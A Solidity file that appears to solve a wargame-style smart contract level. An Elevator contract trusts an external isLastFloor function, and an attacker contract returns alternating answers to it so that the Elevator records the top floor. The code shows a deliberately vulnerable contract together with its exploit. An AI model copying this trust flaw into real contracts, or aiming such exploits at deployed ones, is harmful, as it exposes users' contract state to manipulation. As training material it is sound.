// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract BuildingO {
    bool public top;
    Elevator public elevator;

    constructor(address _elevatorAddress) {
        elevator = Elevator(_elevatorAddress);
    }

    function isLastFloor(uint _floor) external returns (bool) {
        if (top) {
            top = false;
        }
        else {
            top = true;
        }
        return top;
    }
    function goTo() public {
        top = true;
        elevator.goTo(1);
    }
}